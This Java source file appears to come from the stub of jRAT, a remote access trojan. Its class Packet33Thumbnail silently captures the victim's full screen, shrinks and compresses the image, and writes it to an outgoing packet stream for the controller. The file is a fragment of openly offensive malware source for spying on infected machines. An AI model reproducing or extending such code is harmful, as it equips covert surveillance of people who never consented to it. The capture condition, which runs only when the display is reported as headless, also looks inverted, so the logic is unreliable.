package se.jrat.stub.packets.outgoing;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;
import se.jrat.common.utils.ImageUtils;
import se.jrat.stub.utils.ScreenUtils;

public class Packet33Thumbnail extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		if (ScreenUtils.isHeadless()) {
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenShot = new Robot().createScreenCapture(screenRect);
			screenShot = ImageUtils.resize(screenShot, 150, 100);

			byte[] buffer = ImageUtils.encode(screenShot, 0.5F);
			dos.writeInt(buffer.length);
			dos.write(buffer);
		}
	}

	@Override
	public byte getPacketId() {
		return 33;
	}

}
